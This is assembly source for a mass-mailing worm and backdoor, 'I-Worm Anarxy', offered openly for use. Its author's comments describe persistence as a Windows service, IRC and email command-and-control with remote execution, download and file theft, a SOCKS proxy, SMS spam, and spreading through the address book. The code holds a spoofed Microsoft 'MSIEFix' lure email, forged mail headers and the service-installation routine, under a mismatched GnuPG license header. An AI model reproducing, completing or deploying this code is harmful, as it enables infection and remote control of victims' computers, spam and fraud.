; I-Worm Anarxy by Ratter

; COMMENT~
; Ok. After a long time i have decided to release my Anarxy. I don't
; want to talk a lot about virus ... only some thingz that are
; important
; 
; 1. It installs itself as a Service under WinNT/2k and via registry
;  (Run key) under Win9x
; 2. After run it waits for internet connection and then runs 3 threads
; 3. One thread is sms_thread which generates a sms number which
; belongs to one of Czech mobil fones providers and sends there a
; random sms (textz are listed below)
; 3. Second thread is a soxz_proxy thread - it is a soxz5 proxy which
; waits on [SOXZ_PORT] port for incoming connections. Done mainly for
; IP address hiding on irc.
; 4. The last thread can be a) ircbot_thread
;             b) pop3_gateway_thread
; 5. Own SMTP client ...
; 6. Gets email addresses via The Bat! Address Boox
; 
; Via Anarxy backdoor features you can manage remote machine via IRC or 
; via Email (- done mainly for mobil fone managing support ...)
; Commandz avalaible are listed below ... Some of them are avalaible
; only under IRC version and some of them only under Email version.
; 
; IRCBot Version
; Connectz to Undernet network and creates #iworm_anarxy_channel
; channel with key vx_scene. Then waits for commandz. First you must
; !login and after end of you're werk !logout.
; 
; Email Version
; Tries to connect to an POP3 account. If it can't connect it tries it
; in one minute intervals five times. Then it runs IRCBot version. If
; it can connect it starts to retrieves emails and do the commands
; included. It retrieves messages from the end (from the newest one).
; 
; Email Syntax
; first must be !<password> then are flagz (number) and then commandz
; separated by ";". in the end of the mail must me !end; .. eg
; !<password> 2 !info; !end
; will get info about machine and send it to the return-path. It won't
; be deleted so every 3 minutes (thats a check time for an new
; messages) will send this info.
; Then there is a EMAIL_SMS flag which says that the sender of this
; email was an mobil fone ... When this flag is set the reply will be
; devided into X parts becoz of mobil fone can't show max then XXX
; chars. (my mobil fone. maybe you'rse is better so don't need to do it 
; :))
; 
; The compilation can be directed via flagz.
; LOG flag - log IRC sessions and SMTP ones?
; WORM flag - get The Bat! AB emails and send there MSIEFIX ?
; EMAIL flag - email version instead of irc one?
; DEL_EMAILZ flag - del email (wont' werk if DELETE_FORBIDDEN flag in email
;       will be set)
; _SEND_NOTICE_ flag - send notice about victim? This will send an
;   email with ip address of victim ...)
; 
; The best compilation flagz:
; LOG off
; WORM on/off (worm/backdoor)
; EMAIL on
; DEL_EMAILZ on
; _SEND_NOTICE_ on/off (backdoor/worm)
; then send a email to email address Anarxy will check. sth like this
; !<password> 2 !ircbot_run; !end;
; it will everytime run an irc version but it will also chek new emailz 
; to done ... (you can send files via emails - base64decode routine
; present - command !save_email_filez)
; 
; I think i have forgotten some thingiez so go trough the code to find out more thingz ...
; 
; If you want to protect you're compiled program go to http://www.suddendischarge.com/
; and find you're own protector :)
; 
; Ratter (ratter@atlas.cz) - I'm a stranger in the world I haven't made.
; 
; Thx to Bumblebee, VirusBuster, Benny and a lotta of others ... in
; next release i'll name them :) i can't remember now ...
; 
; Also to Psi Vojaci, KMFDM, Nine Inch Nails, P.J. Harvey, Rammstein,
; Iron Maden, Arakain and others ...
; 
; btw before compilation change XXX strings to good ones according to
; you ... and also change BotPassword :)
; 
; --------------------------------------------------------------------
; This file is part of GnuPG.
; 
; GnuPG is free software; you can redistribute it and/or modify
; it under the terms of the GNU General Public License as published by
; the Free Software Foundation; either version 2 of the License, or
; (at your option) any later version.
; 
; GnuPG is distributed in the hope that it will be useful,
; but WITHOUT ANY WARRANTY; without even the implied warranty of
; MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
; GNU General Public License for more details.
; You should have received a copy of the GNU General Public License
; along with this program; if not, write to the Free Software
; Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA
; --------------------------------------------------------------------
; ~

; Disclaimer
; ----------
; This is the source of a I-WORM. Feel free to use at your will.
; Notice that the author is not responsabile of the damages that
; may occur due to the assembly of this file.

; Textz that are sent by sms_thread
; -----------------------------------------------------------------------------
; This mobile fone has been infected by IWORM.Anarxy by Ratter!
; -----------------------------------------------------------------------------
; Let us arise, let us arise against the oppressors of humanity; all kings,
; emperors, presidents of republics, priests of all religions are the true
; enemies of the people; let us destroy along with them all juridical, political,
; civil and religious institutions.
;
;                - Manifesto of anarchists in the Romagna, 1878
; -----------------------------------------------------------------------------
; I know you're real proud of this world you've built, the way it worx, all
; the nice little rules and such, but I've got some bad news.
;
; I've decided to make a few changes.
;
; Ratter - I'm a stranger in the world I haven't made.
; -----------------------------------------------------------------------------
; I love a flower, becoz it will wither, an animal - becoz it will die; - a human
; being, becoz it will pass away and won't be, becoz it feel's it will perish
; forever; I love - I do more than love - I worship to God, becoz - he is not.
;
;       - Karel Hynek Macha

; Commandz Syntax
;   !login <password>
;   !quit
;   !reconnect
;   !logout
;   !opme [<channel>]
;   !redir <message>
;   !chg_pswd <new_password>
;   !exec <command_line>
;   !version
;   !send <file_name> <to>
;   !info
;   !delete <file_name>|<file_mask>
;   !leave
;   !reboot
;   !email_msg <rcpt> <from> <count> "<subject>" "<message>"
;   !email_redir <rcpt> <from> <count> <file_with_smtp_data>
;   !email_file <rcpt> <from> "<subject>" "<message>" <attachment_file>
;   !email_spread <email_address>
;   !ls <directory&mask>
;   !sms_send <rcpt> <from> <count> "<subject>" "<message>"
;   !setup_sms <sms_max>
;   !upgrade <http|ftp_internet_addr>
;   !dl_file <http|ftp_internet_addr>
;   !add_oper <handle> <access_ritez>
;   !remove_oper <handle>
;   !list_operz
;   !msg_box <paramz> "<caption>" "<text>"
;   !setup_pop3 <email_addr> <pop3_server> <username> <password>
; Email only commandz
;   !save_email_filez <count>
;   !ircbot_run
;   !del_emailz <message_start> <howmuch>


    .586p
    .model  flat, stdcall
    locals

    ;log        equ 1
    worm        equ 1
    ;email      equ 1
    ;del_emailz equ 1
    ;_send_notice_  equ 1
    
    extrn   CloseHandle:PROC
    extrn   WriteFile:PROC
    extrn   FlushFileBuffers:PROC
    extrn   GetModuleFileNameA:PROC
    extrn   ExitProcess:PROC
    extrn   WSAStartup:PROC
    extrn   CreateFileA:PROC
    extrn   HeapCreate:PROC
    extrn   HeapDestroy:PROC
    extrn   HeapAlloc:PROC
    extrn   closesocket:PROC
    extrn   socket:PROC
    extrn   isalpha:PROC
    extrn   gethostbyname:PROC
    extrn   gethostbyaddr:PROC
    extrn   inet_addr:PROC
    extrn   connect:PROC
    extrn   WSAGetLastError:PROC
    extrn   htons:PROC
    extrn   htonl:PROC
    extrn   HeapFree:PROC
    extrn   gethostname:PROC
    extrn   send:PROC
    extrn   recv:PROC
    extrn   lstrcmpi:PROC
    extrn   lstrcpy:PROC
    extrn   lstrlen:PROC
    extrn   GetTickCount:PROC
    extrn   CreateThread:PROC
    extrn   ReadFile:PROC
    extrn   GetFileSize:PROC
    extrn   bind:PROC
    extrn   listen:PROC
    extrn   select:PROC
    extrn   accept:PROC
    extrn   Sleep:PROC
    extrn   inet_ntoa:PROC
    extrn   ntohl:PROC
    extrn   ExitThread:PROC
    extrn   RasEnumConnectionsA:PROC
    extrn   RasGetConnectStatusA:PROC
    extrn   CreateMutexA:PROC
    extrn   GetVersion:PROC
    extrn   GetModuleHandleA:PROC
    extrn   GetProcAddress:PROC
    extrn   OpenMutexA:PROC
    extrn   ExpandEnvironmentStringsA:PROC
    extrn   ExitWindowsEx:PROC
    extrn   CopyFileA:PROC
    extrn   RegCreateKeyExA:PROC
    extrn   RegSetValueExA:PROC
    extrn   RegCloseKey:PROC
    extrn   RegDeleteValueA:PROC
    extrn   RegEnumKeyExA:PROC
    extrn   RegDeleteKeyA:PROC
    extrn   RegQueryValueExA:PROC
    extrn   DeleteFileA:PROC
    extrn   WSACleanup:PROC
    extrn   sendto:PROC
    extrn   WritePrivateProfileStringA:PROC
    extrn   GetPrivateProfileStringA:PROC
    extrn   WaitForSingleObject:PROC
    extrn   WaitForMultipleObjects:PROC
    extrn   TerminateThread:PROC
    extrn   GetDateFormatA:PROC
    extrn   lstrcatA:PROC
    extrn   WinExec:PROC
    extrn   GetExitCodeThread:PROC
    extrn   GetLocalTime:PROC
    extrn   CreateFileMappingA:PROC
    extrn   MapViewOfFile:PROC
    extrn   UnmapViewOfFile:PROC
    extrn   FindFirstFileA:PROC
    extrn   FindNextFileA:PROC
    extrn   FindClose:PROC
    extrn   GetComputerNameA:PROC
    extrn   GetThreadContext:PROC
    extrn   SetThreadContext:PROC
    extrn   GetCurrentThread:PROC
    extrn   MessageBoxA:PROC
    extrn   HeapReAlloc:PROC
    
    extrn   InternetOpenA:PROC
    extrn   InternetOpenUrlA:PROC
    extrn   InternetQueryDataAvailable:PROC
    extrn   InternetReadFile:PROC
    extrn   InternetCloseHandle:PROC

    extrn   GetLastError:PROC

    include useful.inc
    include win32api.inc
    
SERVICE_TABLE_ENTRY struc
    STE_ServiceName dd  ?
    STE_ServiceProc dd  ?
SERVICE_TABLE_ENTRY ends

SERVICE_STATUS      struc
    SS_ServiceType          dd  ?
    SS_CurrentState         dd  ?
    SS_ControlsAccepted     dd  ?
    SS_Win32ExitCode        dd  ?
    SS_ServiceSpecificExitCode  dd  ?
    SS_CheckPoint           dd  ?
    SS_WaitHint         dd  ?
SERVICE_STATUS      ends

OVERLAPPED      struc
    O_Internal  dd  ?
    O_InternalHigh  dd  ?
    O_loffset   dd  ?
    O_OffsetHigh    dd  ?
    O_hEvent    dd  ?
OVERLAPPED      ends

sockaddr_in struc
    sin_family  dw  ?
    sin_port    dw  ?
    sin_addr    dd  ?
    sin_zero    db  8 dup (?)
sockaddr_in ends

hostent     struc
    h_name      dd  ?
    h_alias     dd  ?
    h_addr      dw  ?
    h_len       dw  ?
    h_list      dd  ?
hostent     ends

timeval     struc
    tv_sec  dd  ?
    tv_usec dd  ?
timeval     ends

fd_set      struc
    fd_count    dd  ?
    fd_array    dd  ?
fd_set      ends

RASCONNSTATUSA      struc
    RCS_dwSize      dd  ?
    RCS_rasconnstate    dd  ?
    RCS_dwError     dd  ?
    RCS_szDeviceType    db  16 + 1 dup(?)
    RCS_szDeviceName    db  128 + 1 dup(?)
RASCONNSTATUSA      ends

_email_     struc
    EM_MailFrom dd  ?   ; pointer to ASCIIZ
    EM_RcptTo   dd  ?   ; pointer to ASCIIZ
    EM_Subject  dd  ?   ; pointer to ASCIIZ
    EM_Message  dd  ?   ; pointer to ASCIIZ
    EM_FilezNum dd  ?   ; number of filez; if highest bit is set
                    ; then in EM_Filez is a *.msg file
    EM_Filez    dd  ?   ; pointer to ASCIIZ pointerz
_email_     ends

SYSTEMTIME  struc
    ST_Year     dw  ?
    ST_Month    dw  ?
    ST_DayOfWeek    dw  ?
    ST_Day      dw  ?
    ST_Hour     dw  ?
    ST_Minute   dw  ?
    ST_Second   dw  ?
    ST_Milliseconds dw  ?
SYSTEMTIME  ends

oper        struc
    OP_Oper     dd  ?
    OP_Rites    db  ?   ; 1 - RW; 0 - Ronly
oper        ends

_temp_buffer_   struc
            db  200 dup(?)
_temp_buffer_   ends

@copy       macro   source
    local   copy_end
    local   copy_loop
    push esi
    mov esi, source
copy_loop:
    lodsb
    test al, al
    jz copy_end
    stosb
    jmp copy_loop
copy_end:
    pop esi
endm

@endsz_     macro
        local   nxtchr
        push esi
        mov esi, edi
nxtchr:
    lodsb
    test al, al
    jnz nxtchr
    xchg esi, edi
    pop esi
endm

@pushvar    macro   variable, empty
    local   next_instr
    ifnb <empty>
    %out too much arguments in macro '@pushvar'
    .err
    endif
    call next_instr
    variable
next_instr:
endm

    CR_LF               equ 0a0dh
    WAIT_TIMEOUT            equ     103h
    SMTP_PORT           equ 25

    SC_MANAGER_CONNECT      equ 1
    SC_MANAGER_CREATE_SERVICE   equ 2
    DELETE              equ 10000h
    SERVICE_AUTO_START      equ 2
    SERVICE_WIN32_OWN_PROCESS   equ 10h
    SERVICE_ACCEPT_SHUTDOWN     equ 4
    SERVICE_CONTROL_RUN     equ 0
    CK_SERVICE_CONTROL      equ 0
    CK_PIPE             equ 1
    NO_ERROR            equ 0
    
    SERVICE_CONTROL_INTERROGATE equ 4
    SERVICE_CONTROL_SHUTDOWN    equ 5

    SERVICE_STOPPED         equ 1
    SERVICE_START_PENDING       equ 2
    SERVICE_STOP_PENDING        equ 3
    SERVICE_RUNNING         equ 4
    SERVICE_CONTINUE_PENDING    equ 5
    SERVICE_PAUSE_PENDING       equ 6
    SERVICE_PAUSED          equ 7

    PIPE_ACCESS_OUTBOUND        equ 2
    PIPE_TYPE_BYTE          equ 0
    FILE_FLAG_OVERLAPPED        equ 40000000h
    
    INFINITE            equ -1

    EWX_LOGOFF                  equ 0
    EWX_REBOOT          equ 2
    EWX_FORCE           equ 4
    
    AF_INET         equ 2
    HEAP_ZERO_MEMORY    equ 8
    SOCK_STREAM     equ 1
    MAX_ALLOWED_OPERZ   equ 5
    SYNCHRONIZE     equ 100000h

    RASCS_CONNECTED     equ 2000h
    MOVEFILE_DELAY_UNTIL_REBOOT equ 4
    HKEY_LOCAL_MACHINE  equ 80000002h
    KEY_ENUMERATE_SUB_KEYS  equ 8h
    HKEY_USERS      equ 80000003h
    KEY_QUERY_VALUE     equ 1
    KEY_SET_VALUE       equ 2
    REG_SZ          equ 1
    REG_DWORD       equ 4
    ERROR_NO_MORE_ITEMS equ 259
    
    INET_THREADZ_COUNT  equ 3
    INTERNET_OPEN_TYPE_DIRECT   equ 1

    POP3_PORT       equ 110
    OK          equ "KO+"
    ERROR           equ ""
    
    SOXZ_PORT       equ 1080

    EMAIL_SMS       equ 1
    DELETE_FORBIDDEN    equ 2
    
        .data
    
    ste SERVICE_TABLE_ENTRY <offset service_name, offset service_main>
        SERVICE_TABLE_ENTRY <0, 0>
        
    service_name    db  "MSIEFixService", 0
    service_name_size   equ $-service_name
    pipe_send   db  "IWorm.Anarxy by Ratter"
    pipe_send_size      equ $-pipe_send

    SC_Manager  dd  ?
    hIOCP       dd  ?


    service_ctrl_to_pend    dd  SERVICE_START_PENDING
                dd  SERVICE_STOP_PENDING
                dd  SERVICE_PAUSE_PENDING
                dd  SERVICE_CONTINUE_PENDING
                dd  0
                dd  SERVICE_STOP_PENDING
                
    service_pend_to_state   dd  0
                dd  0
                dd  SERVICE_RUNNING
                dd  SERVICE_STOPPED
                dd  0
                dd  SERVICE_RUNNING
                dd  SERVICE_PAUSED

    _sin_       sockaddr_in <0, 0, 0, 0>
    
    
    server_names    dd  offset server_1
            dd  offset server_2
            dd  offset server_3
            dd  offset server_4
            dd  offset server_5
            dd  offset server_6
            dd  offset server_7
            dd  0
            
    server_ports    dw  6667
            dw  6668
            dw  6668
            dw  7000
            dw  6664
            dw  7777
            dw  6667
                
    server_1    db  "newbrunswick.nj.us.undernet.org", 0
    server_2    db  "graz.at.eu.undernet.org", 0
    server_3    db  "antwerpen.be.eu.undernet.org", 0
    server_4    db  "caen.fr.eu.undernet.org", 0
    server_5    db  "oslo.no.eu.undernet.org", 0
    server_6    db  "lulea.se.eu.undernet.org", 0
    server_7    db  "amsterdam.nl.eu.undernet.org", 0
    
    cur_server_name dd  0

    my_nick     db  "NICK $my_nick", 0
    my_user     db  "USER $user_name x x :$real_name", 0
    my_join     db  "JOIN $channel $key", 0
    key_channel db  "MODE $channel +sk $key", 0
    invisible   db  "MODE $my_nick +i", 0

    replacementz    dd  offset my_nick_
    _my_nick    dd  offset my_nick__
            dd  offset user_name_
            dd  offset user_name__
            dd  offset real_name_
            dd  offset real_name__
            dd  offset channel_
    channel     dd  offset channel__
            dd  offset key_
            dd  offset key__
            dd  offset dcc_file_
    dcc_file    dd  12345678h
            dd  offset dcc_rcp_
    dcc_rcp     dd  12345678h
            dd  offset op_who_
    op_who      dd  12345678h
            dd  offset recipient_
    recipient   dd  12345678h
            dd  offset privmsg_what_
    privmsg_what    dd  12345678h
            dd  offset pong_reply_
    pong_reply  dd  12345678h
            dd  email_message_
    email_message   dd  offset email_message_buffer
            dd  0

    email_message_  db  "email_message", 0
    my_nick_    db  "my_nick", 0
    user_name_  db  "user_name", 0
    user_name__ db  "Ratter", 0
    real_name_  db  "real_name", 0
    real_name__ db  "IRCBot", 0
    pong_reply_ db  "pong_reply", 0
    channel_    db  "channel", 0
    channel__   db  "#iworm_anarxy_channel", 0
    key_        db  "key", 0
    key__       db  "vx_scene", 0
    recipient_  db  "recipient", 0
    privmsg_what_   db  "privmsg_what", 0
    op_who_     db  "op_who", 0
    dcc_rcp_    db  "dcc_rcp", 0
    dcc_file_   db  "dcc_file", 0
        
    email_message_buffer    db  5 dup(0)
        my_nick__   db  10 dup(0)
    
    commandz    dd  offset ping_command
            dd  offset ping_fc
            dd  offset motd_command
            dd  offset my_join_fc
            dd  offset motd_error
            dd  offset my_join_fc
            dd  offset privmsg_command
            dd  offset privmsg_fc
            dd  offset nick_col_error
            dd  offset nick_error_fc
            dd  offset error
            dd  offset error_fc
            dd  0
                
    ping_command    db  "PING", 0
    pong_command    db  "PONG :$pong_reply", 0
    motd_command    db  "375", 0
    motd_error  db  "422", 0
    privmsg_command db  "PRIVMSG", 0
    privmsg_msg db  "PRIVMSG $recipient :$privmsg_what", 0
    nick_col_error  db  "433", 0
    op_message  db  "MODE $channel +o $op_who", 0
    dont_ping_me    db  "DONT ping me", 0
    dcc_send_msg    db  "PRIVMSG $dcc_rcp :", 01h, "DCC SEND $dcc_file "
    dcc_send_msg_   db  40 dup(?)
    error       db  "ERROR", 0
    quit_message    db  "QUIT :I'm a stranger in the world I haven't made.", 0
    version_message db  "PRIVMSG $recipient :IWorm.Anarxy - IRCB0t&Backd00r v1.7 c0ded by Ratter", 0

    bot_commandz    db  6, "!login"
            dd  offset bot_login_command
            db  5, "!quit"
            dd  offset bot_quit_command
            db  10, "!reconnect"
            dd  offset bot_reconnect_command
            db  7, "!logout"
            dd  offset bot_logout_command
            db  5, "!opme"
            dd  offset bot_opme_command
            db  6, "!redir"
            dd  offset bot_redir_command
            db  9, "!chg_pswd"
            dd  offset bot_chg_pswd_command
            db  5, "!exec"
            dd  offset execute_command
            db  8, "!version"
            dd  offset version_command
            db  4, "ping"
            dd  offset ping_command_
            db  5, "!send"
            dd  offset send_command
            db  8, "dcc SEND"
            dd  offset dcc_rcv_command
            db  5, "!info"
            dd  offset info_command
            db  7, "!delete"
            dd  offset delete_command
            db  6, "!leave"
            dd  offset leave_command
            db  10, "!email_msg"
            dd  offset email_msg
            db  12, "!email_redir"
            dd  offset email_redir
            db  11, "!email_file"
            dd  offset email_file
            db  13, "!email_spread"
            dd  offset email_spread
            db  3, "!ls"
            dd  offset ls_command
            db  9, "!sms_send"
            dd  offset send_sms
            db  10, "!setup_sms"
            dd  offset setup_sms
            db  8, "!upgrade"
            dd  offset upgrade_command
            db  8, "!dl_file"
            dd  offset dl_file_command
            db  9, "!add_oper"
            dd  offset add_oper_command
            db  12, "!remove_oper"
            dd  offset remove_oper_command
            db  11, "!list_operz"
            dd  offset list_operz_command
            db  8, "!msg_box"
            dd  offset msg_box_command
            db  11, "!setup_pop3"
            dd  offset setup_pop3_command
            db  7, "!reboot"
            dd  offset reboot_command

            ; Email only commandz
            db  17, "!save_email_filez"
            dd  offset save_email_filez_command
            db  11, "!ircbot_run"
            dd  offset ircbot_run_command
            db  11, "!del_emailz"
            dd  offset del_emailz_command

            db  0
IFDEF   log
    log_handle  dd  ?
ENDIF
    
    heap_handle dd  ?
    buffer      dd  ?
    in_buffer   dd  ?
    str_buffer  dd  ?
    temp_buffer dd  ?
    socket_handle   dd  ?
    local_host_ip   dd  ?
    bytes_read  dd  ?
    cur_in_buffer   dd  ?
    oper_buffer dd  ?
    
    msg_from    dd  ?
    msg_command dd  ?
    msg_to      dd  ?
    msg_paramz  dd  ?
        
    to_flag     dd  ?
    syn_flag    dd  ?

    all_iz_ok   db  "!Ok", 0
    error_      db  "!Error", 0

    bot_password    dd  0392a4613h
    
    operz       dd  0
            oper    MAX_ALLOWED_OPERZ dup(<>)
            dd  -1

    online_flag dd  0
    
    fc_import   db  "kernel32.dll", 0
            dd  7
            db  "CreateNamedPipeA", 0
CreateNamedPipeA    dd  ?
            db  "ConnectNamedPipe", 0
ConnectNamedPipe    dd  ?
            db  "DisconnectNamedPipe", 0
DisconnectNamedPipe dd  ?
            db  "PostQueuedCompletionStatus", 0
PostQueuedCompletionStatus  dd  ?
            db  "CreateIoCompletionPort", 0
CreateIoCompletionPort  dd  ?
            db  "GetQueuedCompletionStatus", 0
GetQueuedCompletionStatus   dd  ?
            db  "MoveFileExA", 0
MoveFileExA     dd  ?

            db  "advapi32.dll", 0
            dd  8
            db  "OpenSCManagerA", 0
OpenSCManagerA      dd  ?
            db  "StartServiceCtrlDispatcherA", 0
StartServiceCtrlDispatcherA dd  ?
            db  "OpenServiceA", 0
OpenServiceA        dd  ?
            db  "CloseServiceHandle", 0
CloseServiceHandle  dd  ?
            db  "CreateServiceA", 0
CreateServiceA      dd  ?
            db  "DeleteService", 0
DeleteService       dd  ?
            db  "RegisterServiceCtrlHandlerA", 0
RegisterServiceCtrlHandlerA dd  ?
            db  "SetServiceStatus", 0
SetServiceStatus    dd  ?
            dd  -1

    base64_alphabet db  'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
            db  '0123456789+/'

    msiefix_email   _email_ <msiefix_from, 0, msiefix_subject, msiefix_message, \
                1, msiefix_file>
    
    msiefix_from    db  "support@microsoft.com", 0
    msiefix_subject db  "MSIEFix", 0
    msiefix_message db  "This is a fix, which will repair the newest bugs in Microsoft Internet Explorer."
            dw  CR_LF
            db  "You're Internet Explorer Development Team"
            dw  CR_LF
            db  0
    msiefix_file    dd  offset msiefix_file_
    msiefix_file_   dd  ?

    date_format db  "MM/dd/yy", 0

    return_path db  "Return-Path:", 0
    boundary    db  'boundary="', 0
    pop3_name   db  'name="', 0

        helo_cmd    db  "helo ", 0
    mail_from   db  "mail from:", 0
    rcpt_to     db  "rcpt to:", 0
    data        db  "data"
            dw  CR_LF
            db  0
    end_data    dw  CR_LF
            db  "."
            dw  CR_LF
            db  0
    quit        db  "quit"
            dw  CR_LF
            db  0
        
    recieved    db  "Recieved: from mail.microsoft.com ([194.228.158.208]) with Microsoft SMTPSVC(5.5.1877.357.35)"
            dw  CR_LF
            db  0
        date        db  "Date: ", 0
    from        db  "From: ", 0
    to      db  "To: ", 0
    subject     db  "Subject: ", 0
    header      db  "MIME-Version: 1.0"
            dw  CR_LF
            db      "Message-ID: <--------122123B62DDFA11B>"
            dw  CR_LF
            db      'Content-Type: multipart/mixed; boundary="----------122123B62DDFA11B"'
            dw  CR_LF, CR_LF
            db  0
    text        db  "------------122123B62DDFA11B"
            dw  CR_LF
            db      "Content-Type: text/plain; charset=us-ascii"
            dw  CR_LF
                    db      "Content-Transfer-Encoding: 7bit"
                    dw  CR_LF, CR_LF
                    db  0
    end_boundary    db  "------------122123B62DDFA11B--"
            dw  CR_LF, CR_LF
            db  0
    attachment  db  "------------122123B62DDFA11B"
            dw  CR_LF
            db  'Content-Type: application/octet-stream; name="', 0
    attachment_ db  '"'
            dw  CR_LF
            db  "Content-Transfer-Encoding: base64"
            dw  CR_LF
            db      'Content-Disposition: attachment; filename="', 0

    _smtp_      db  "smtp.", 0
    _mail_      db  "mail.", 0
    
    predvolby   db  "0601"
            db  "0602"
            db  "0606"
            db  "0607"
            db  "0723"
            db  "0724"
            
    _sms_       db  'This mobile fone has been infected by IWORM.Anarxy by Ratter!'
            dw  CR_LF
            db  0
        
    _sms_1      db  'Let us arise, let us arise against the oppressors of humanity; all kings,'
            dw  CR_LF
            db  'emperors, presidents of republics, priests of all religions are the true'
            dw  CR_LF
            db  'enemies of the people; let us destroy along with them all juridical, political,'
            dw  CR_LF
            db  'civil and religious institutions.'
            dw  CR_LF
            db  '- Manifesto of anarchists in the Romagna, 1878'
            dw  CR_LF
            db  0

    _sms_2      db  'I know you''re real proud of this world you''ve built, the way it worx, all'
            dw  CR_LF
            db  'the nice little rules and such, but I''ve got some bad news.'
            dw  CR_LF
            db  'I''ve decided to make a few changes.'
            dw  CR_LF
            db  'Ratter - I''m a stranger in the world I haven''t made.'
            dw  CR_LF
            db  0

    _sms_3      db  'I love a flower, becoz it will wither, an animal - becoz it will die; - a human'
            dw  CR_LF
            db  'being, becoz it will pass away and won''t be, becoz it feel''s it will perish'
            dw  CR_LF
            db  'forever; I love - I do more than love - I worship to God, becoz - he is not.'
            dw  CR_LF
            db  '- Karel Hynek Macha'
            dw  CR_LF
            db  0
            
    _smses_     dd  offset _sms_
            dd  offset _sms_1
            dd  offset _sms_2
            dd  offset _sms_3
            
    sms_email   db  "0042"
    sms_number  db  "0000000000@sms.eurotel.cz", 0
    sms_from    db  "anarxy_the_world@anarxy.com", 0


    IFDEF   _send_notice_
    notice_email    _email_ <pop3_email_addr, notice_rcpt, 0, notice_message, \
                0, 0>
    notice_message  db  "Victim XXX, whos ip is: "
    notice_ip   db  25 dup(20h)
            db  "is now connected to Internet ...", 0
    notice_rcpt db  "XXX@XXX.XXX", 0
    ENDIF

    address_book    db  "Address Book #"
    address_book_   db  4 dup(?)

    sms_max     dd  117
    inet_threadz    dd  INET_THREADZ_COUNT dup(?)

    pop3_email_addr db  "XXX"
                db  (40-($-pop3_email_addr)) dup(?)

    pop3_server db  "XXX"   ; 20 bytez for POP3_SERVER
            db  (20-($-pop3_server)) dup(?)

    pop3_user   db  "USER "
    pop3_user_  db  "XXX"   ; 20 bytez for POP_USER
            db  (20-($-pop3_user_)+3) dup(?)
                        ; without CR_LF and \null
    pop3_password   db  "PASS "
    pop3_password_  db  "XXX"   ; 20 bytez for POP3_PASSWORD
            db  (20-($-pop3_password_)+3) dup(?)
                        ; without CR_LF and \null
    pop3_quit   db  "QUIT"
            dw  CR_LF
            db  0
    
    pop3_handle dd  ?

    pop3_stat   db  "STAT", 0
    pop3_list   db  "LIST $email_message", 0
    pop3_top    db  "TOP $email_message 1", 0
    pop3_retr   db  "RETR $email_message", 0
    pop3_dele   db  "DELE $email_message", 0

    is_user_allowed dd  offset _is_user_allowed_
    send_message    dd  offset _send_message_
    message_for_who dd  offset _message_for_who_
    
    hu_subkey   db  ".DEFAULT\Software\MSIEFix", 0
    pswd_name   db  "Pswd", 0
    pop3_server_name    db  "POP3_Server", 0
    pop3_user_name      db  "POP3_User", 0
    pop3_password_name  db  "POP3_Pswd", 0
    pop3_email_     db  "POP3_Eml", 0
    
    default_settingz    dd  HKEY_USERS      ; key
                dd  offset hu_subkey    ; subkey
                dd  5           ; count of Valz
                
                dd  REG_DWORD       ; type
                dd  offset pswd_name    ; val_name
                dd  offset bot_password ; val pointer
                
                dd  REG_SZ
                dd  offset pop3_server_name
                dd  offset pop3_server
                
                dd  REG_SZ
                dd  offset pop3_user_name
                dd  offset pop3_user_
                
                dd  REG_SZ
                dd  offset pop3_password_name
                dd  offset pop3_password_

                dd  REG_SZ
                dd  offset pop3_email_
                dd  offset pop3_email_addr

    _query_settingz_    dd  HKEY_USERS      ; key
                dd  offset hu_subkey    ; subkey
                dd  5           ; count of Valz
                dd  4
                dd  offset pswd_name
                dd  0
                dd  20
                dd  offset pop3_server_name
                dd  0
                dd  20
                dd  offset pop3_user_name
                dd  0
                dd  20
                dd  offset pop3_password_name
                dd  0
                                dd  40
                dd  offset pop3_email_
                dd  0

    query_settingz      dd  HKEY_USERS      ; key
                dd  offset hu_subkey    ; subkey
                dd  5           ; count of Valz
                
                dd  4           ; buffer size
                dd  offset pswd_name    ; val_name
                dd  offset bot_password ; buffer pointer
                
                dd  20
                dd  offset pop3_server_name
                dd  offset pop3_server
                
                dd  20
                dd  offset pop3_user_name
                dd  offset pop3_user_
                
                dd  20
                dd  offset pop3_password_name
                dd  offset pop3_password_

                dd  40
                                dd  offset pop3_email_
                dd  offset pop3_email_addr


    soxz_proxy_fcz      dd  3
                dd  offset soxz_method
                dd  offset soxz_authentization
                dd  offset soxz_make_proxy

    soxz_commandz       dd  offset soxz_make_connect
                dd  offset soxz_error
                dd  offset soxz_error

    stime       SYSTEMTIME  <>

                db  "Dedicated to one great girlie named Bara. "
                db  "In Czech Republic; 25.1.2001"
    
    .code
start:
    @pushsz "MSIEFixMutex"
    push 0
    push SYNCHRONIZE
    call OpenMutexA
    xchg eax, ecx
    jecxz ima_not_running
    
    push ecx
    call CloseHandle
    
    jmp exit_program

ima_not_running:
    call anti_debug
    
    lea esi, [_query_settingz_]
    call query_registry
    jz registry_ok

    call set_default_settingz
    jmp registry_ok_
registry_ok:
    lea esi, [query_settingz]
    call query_registry
registry_ok_:

    call GetVersion
    test eax, 8000000h
    jz ima_on_win9x

    call get_fcz_address
    jc ima_on_win9x
    
    push SC_MANAGER_CONNECT or SC_MANAGER_CREATE_SERVICE
    push 0
    push 0
    call OpenSCManagerA
    test eax, eax
    jz ima_on_win9x
    
    mov dword ptr [SC_Manager], eax

    push DELETE
    push offset service_name
    push eax
    call OpenServiceA
    xchg eax, ecx
    jecxz install_service

    push ecx
    call CloseServiceHandle
    
    push dword ptr [SC_Manager]
    call CloseServiceHandle

    push offset ste
    call StartServiceCtrlDispatcherA
    
exit_program:
    push 0
    call ExitProcess
    
install_service:
    sub esp, 200
    mov esi, esp
    
    push 200
    push esi
    @pushsz "%windir%\system32\msiefix.exe"
    call ExpandEnvironmentStringsA
    
    sub esp, 300
    mov edi, esp
    
    push 300
    push edi
    push 0
    call GetModuleFileNameA
    
    push 1
    push esi
    push edi
    call CopyFileA
    
    add esp, 300

    xor eax, eax
    push eax
    push eax
    push eax
    push eax
    push eax
    push esi
    push eax            ; SERVICE_ERROR_IGNORE
    push SERVICE_AUTO_START
    push SERVICE_WIN32_OWN_PROCESS
    push eax
    push offset service_name
    push offset service_name
    push dword ptr [SC_Manager]
    call CreateServiceA

    add esp, 200
    
    xchg eax, ecx
    jecxz install_close_sc_manager
    
    push ecx
    call CloseServiceHandle
    
install_close_sc_manager:

    push dword ptr [SC_Manager]
    call CloseServiceHandle

    jmp exit_program

